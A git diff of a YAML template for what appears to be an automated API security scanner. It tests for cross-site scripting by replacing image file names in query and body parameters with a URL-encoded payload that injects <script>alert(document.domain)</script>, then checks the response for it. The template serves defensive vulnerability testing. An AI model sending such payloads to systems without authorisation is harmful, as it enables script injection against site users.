@@ -1,10 +1,10 @@
 id: XSS_VIA_FILE_NAME
 info:
   name: "XSS by changing file names"
-  description: "Testing vulnerability by injecting malicious scripts in filenames to bypass security measures and execute unauthorized code." 
+  description: "Testing vulnerability by injecting malicious scripts in filenames to bypass security measures and execute unauthorized code."
   details: >
-            "Security test that aims to identify vulnerabilities in web applications. By injecting malicious scripts into file names, attackers can bypass security measures and execute unauthorized code on the victim's browser."
-            "This test helps developers uncover and address potential XSS (Cross-Site Scripting) vulnerabilities, ensuring robust protection against malicious attacks."
+    "Security test that aims to identify vulnerabilities in web applications. By injecting malicious scripts into file names, attackers can bypass security measures and execute unauthorized code on the victim's browser."
+    "This test helps developers uncover and address potential XSS (Cross-Site Scripting) vulnerabilities, ensuring robust protection against malicious attacks."
   impact: "An XSS vulnerability can have significant impacts, including the potential for data theft, unauthorized access, session hijacking, defacement of web pages, and the injection of malicious content."
   category:
     name: XSS
@@ -25,6 +25,8 @@ info:
     - CVE-2023-43309
     - CVE-2021-38143
 
+settings:
+  nature: INTRUSIVE
 api_selection_filters:
   method:
     neq: "OPTIONS"
@@ -42,14 +44,14 @@ api_selection_filters:
           for_one:
             value:
               contains_either:
-                  - .jpg
+                - .jpg
             key:
               extract: jpg_file_name
       - query_param:
           for_one:
             value:
               contains_either:
-                  - .jpg
+                - .jpg
             key:
               extract: jpg_file_name
 
@@ -57,14 +59,14 @@ api_selection_filters:
           for_one:
             value:
               contains_either:
-                  - .jpeg
+                - .jpeg
             key:
               extract: jpeg_file_name
       - query_param:
           for_one:
             value:
               contains_either:
-                  - .jpeg
+                - .jpeg
             key:
               extract: jpeg_file_name
 
@@ -72,14 +74,14 @@ api_selection_filters:
           for_one:
             value:
               contains_either:
-                  - .png
+                - .png
             key:
               extract: png_file_name
       - query_param:
           for_one:
             value:
               contains_either:
-                  - .png
+                - .png
             key:
               extract: png_file_name
 
@@ -87,23 +89,23 @@ execute:
   type: single
   requests:
     - req:
-      - modify_query_param:
-          jpg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpg'
-      - modify_body_param:
-          jpg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpg'
+        - modify_query_param:
+            jpg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpg'
+        - modify_body_param:
+            jpg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpg'
 
-      - modify_query_param:
-          jpeg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpeg'
-      - modify_body_param:
-          jpeg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpeg'
+        - modify_query_param:
+            jpeg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpeg'
+        - modify_body_param:
+            jpeg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpeg'
 
-      - modify_query_param:
-          png_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.png'
-      - modify_body_param:
-          png_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.png'
+        - modify_query_param:
+            png_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.png'
+        - modify_body_param:
+            png_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.png'
 
 validate:
   response_payload:
     contains_all:
-        - "<script>alert(document.domain)</script>"
-        - <!doctype html>
+      - "<script>alert(document.domain)</script>"
+      - <!doctype html>
